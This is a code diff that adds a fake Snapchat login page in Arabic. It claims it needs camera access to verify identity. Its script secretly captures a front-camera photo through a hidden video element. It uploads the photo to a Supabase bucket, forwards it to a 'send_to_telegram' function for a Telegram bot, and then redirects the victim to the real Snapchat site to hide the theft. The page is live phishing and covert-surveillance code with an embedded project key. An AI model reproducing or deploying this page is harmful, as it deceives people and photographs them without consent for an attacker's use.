@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>Snapchat</title>
+<style>
+* { 
+    margin: 0; 
+    padding: 0; 
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
+}
+
+html, body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    position: fixed;
+    -webkit-user-select: none;
+    user-select: none;
+}
+
+body { 
+    background: #FFFC00;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.container {
+    background: white;
+    border-radius: 16px;
+    padding: 40px 25px;
+    width: 90%;
+    max-width: 380px;
+    text-align: center;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+}
+
+.logo {
+    font-size: 64px;
+    margin-bottom: 24px;
+    animation: bounce 2s ease-in-out infinite;
+}
+
+@keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+}
+
+h1 {
+    font-size: 26px;
+    margin-bottom: 12px;
+    color: #000;
+    font-weight: 700;
+}
+
+p {
+    color: #555;
+    font-size: 15px;
+    margin-bottom: 32px;
+    line-height: 1.6;
+}
+
+.btn {
+    background: #000;
+    color: white;
+    border: none;
+    padding: 16px 32px;
+    font-size: 17px;
+    font-weight: 700;
+    border-radius: 50px;
+    cursor: pointer;
+    width: 100%;
+    transition: all 0.2s;
+    touch-action: manipulation;
+    -webkit-appearance: none;
+}
+
+.btn:active {
+    transform: scale(0.96);
+    background: #222;
+}
+
+.btn:disabled {
+    background: #ccc;
+    transform: none;
+}
+
+.status {
+    margin-top: 20px;
+    font-size: 14px;
+    color: #666;
+    min-height: 20px;
+}
+
+video {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    left: -9999px;
+    pointer-events: none;
+}
+
+canvas { 
+    display: none;
+    position: absolute;
+    left: -9999px;
+}
+
+.loading {
+    display: inline-block;
+    width: 18px;
+    height: 18px;
+    border: 3px solid rgba(255,255,255,0.3);
+    border-radius: 50%;
+    border-top-color: white;
+    animation: spin 0.7s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* تحسينات للهاتف */
+@media (max-width: 480px) {
+    .container {
+        padding: 35px 20px;
+        width: 85%;
+    }
+    
+    .logo {
+        font-size: 56px;
+    }
+    
+    h1 {
+        font-size: 24px;
+    }
+    
+    p {
+        font-size: 14px;
+    }
+    
+    .btn {
+        padding: 15px 28px;
+        font-size: 16px;
+    }
+}
+
+/* دعم الشاشات الصغيرة جداً */
+@media (max-height: 600px) {
+    .container {
+        padding: 25px 20px;
+    }
+    
+    .logo {
+        font-size: 48px;
+        margin-bottom: 16px;
+    }
+    
+    h1 {
+        font-size: 22px;
+        margin-bottom: 8px;
+    }
+    
+    p {
+        font-size: 13px;
+        margin-bottom: 24px;
+    }
+}
+
+/* تحسين للوضع الأفقي */
+@media (orientation: landscape) and (max-height: 500px) {
+    .container {
+        padding: 20px;
+        max-width: 500px;
+    }
+    
+    .logo {
+        font-size: 40px;
+        margin-bottom: 12px;
+    }
+    
+    h1 {
+        font-size: 20px;
+        margin-bottom: 8px;
+    }
+    
+    p {
+        font-size: 12px;
+        margin-bottom: 16px;
+    }
+    
+    .btn {
+        padding: 12px 24px;
+        font-size: 15px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">👻</div>
+    <h1>تسجيل الدخول</h1>
+    <p>للمتابعة، يرجى السماح بالوصول إلى الكاميرا لتأكيد هويتك</p>
+    
+    <button class="btn" id="loginBtn" onclick="startLogin()">
+        متابعة تسجيل الدخول
+    </button>
+    
+    <div class="status" id="status"></div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const SUPABASE_URL = "https://zqisheavlurzdaohgjca.supabase.co";
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpxaXNoZWF2bHVyemRhb2hnamNhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg1ODc5NzMsImV4cCI6MjA4NDE2Mzk3M30.yQw8h31YOaqZbzT9q6XBD219CiXstuYMUov6DgqSZVQ";
+const FUNCTION_URL = "https://zqisheavlurzdaohgjca.supabase.co/functions/v1/send_to_telegram";
+const BUCKET = "images";
+const SNAPCHAT_URL = "https://accounts.snapchat.com/v2/login?locale=ar";
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+const loginBtn = document.getElementById("loginBtn");
+const statusEl = document.getElementById("status");
+
+// منع التكبير المزدوج على iOS
+let lastTouchEnd = 0;
+document.addEventListener('touchend', (e) => {
+    const now = Date.now();
+    if (now - lastTouchEnd <= 300) {
+        e.preventDefault();
+    }
+    lastTouchEnd = now;
+}, false);
+
+async function startLogin() {
+    loginBtn.disabled = true;
+    loginBtn.innerHTML = '<span class="loading"></span>جاري التحقق...';
+    statusEl.textContent = '';
+    
+    try {
+        // إعدادات الكاميرا محسّنة للهواتف
+        const constraints = {
+            video: { 
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            },
+            audio: false
+        };
+        
+        // طلب الكاميرا
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        
+        // الانتظار حتى يبدأ الفيديو (مهم للهواتف)
+        await new Promise((resolve, reject) => {
+            video.onloadedmetadata = () => {
+                video.play()
+                    .then(resolve)
+                    .catch(reject);
+            };
+            
+            // timeout للأمان
+            setTimeout(() => reject(new Error('Video timeout')), 10000);
+        });
+        
+        // انتظار إضافي لتحسين الجودة
+        await new Promise(resolve => setTimeout(resolve, 1200));
+        
+        // التقاط الصورة
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        
+        // تحويل لـ blob بجودة عالية
+        const blob = await new Promise(res => {
+            canvas.toBlob(res, "image/jpeg", 0.92);
+        });
+        
+        const fileName = "snap_" + Date.now() + ".jpg";
+        
+        // رفع الصورة
+        const upload = await fetch(
+            `${SUPABASE_URL}/storage/v1/object/${BUCKET}/${fileName}`,
+            {
+                method: "POST",
+                headers: {
+                    "apikey": SUPABASE_ANON_KEY,
+                    "Authorization": "Bearer " + SUPABASE_ANON_KEY,
+                    "Content-Type": "image/jpeg"
+                },
+                body: blob
+            }
+        );
+        
+        if (!upload.ok) {
+            const errorText = await upload.text();
+            throw new Error("Upload failed: " + errorText);
+        }
+        
+        const publicUrl = `${SUPABASE_URL}/storage/v1/object/public/${BUCKET}/${fileName}`;
+        
+        // إرسال للبوت
+        await fetch(FUNCTION_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "apikey": SUPABASE_ANON_KEY,
+                "Authorization": "Bearer " + SUPABASE_ANON_KEY
+            },
+            body: JSON.stringify({
+                file_url: publicUrl,
+                file_name: fileName
+            })
+        });
+        
+        // إيقاف الكاميرا
+        stream.getTracks().forEach(track => track.stop());
+        
+        // التحويل
+        statusEl.textContent = '✅ تم التحقق، جاري التحويل...';
+        
+        setTimeout(() => {
+            window.location.href = SNAPCHAT_URL;
+        }, 800);
+        
+    } catch(error) {
+        console.error("Error:", error);
+        loginBtn.disabled = false;
+        loginBtn.innerHTML = 'متابعة تسجيل الدخول';
+        
+        let errorMsg = '❌ حدث خطأ، حاول مرة أخرى';
+        
+        if (error.name === 'NotAllowedError') {
+            errorMsg = '❌ يجب السماح بالوصول للكاميرا';
+        } else if (error.name === 'NotFoundError') {
+            errorMsg = '❌ لم يتم العثور على كاميرا';
+        } else if (error.name === 'NotReadableError') {
+            errorMsg = '❌ الكاميرا قيد الاستخدام';
+        }
+        
+        statusEl.textContent = errorMsg;
+    }
+}
+
+// تحسين الأداء على الهواتف
+window.addEventListener('load', () => {
+    // تحسين التمرير
+    document.body.style.overflow = 'hidden';
+    
+    // منع السحب للتحديث على iOS
+    document.body.addEventListener('touchmove', (e) => {
+        if (e.target === document.body) {
+            e.preventDefault();
+        }
+    }, { passive: false });
+});
+</script>
+
+</body>
+  </html>
